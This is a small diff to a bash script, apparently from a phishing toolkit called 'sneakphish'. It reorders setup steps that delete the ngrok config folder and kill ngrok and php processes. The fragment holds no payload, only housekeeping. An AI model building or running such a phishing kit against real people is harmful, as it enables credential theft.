@@ -1,4 +1,7 @@
 ###Internet And Process###
+cd $HOME
+rm -rf .ngrok2 > /dev/null 2>&1
+cd $HOME/sneakphish
 terminate(){
 pingngrok=$(ps aux | grep -o "ngrok" | head -n1)
 pingphp=$(ps aux | grep -o "php" | head -n1)
@@ -10,8 +13,6 @@ pkill -f -2 php > /dev/null 2>&1
 fi
 }
 terminate
-cd $HOME
-rm -rf .ngrok2 > /dev/null 2>&1
 speed=$(echo $(basename $(readlink -nf $0)))
 if [ "$speed" = "sneakphish.sh" ]
 then
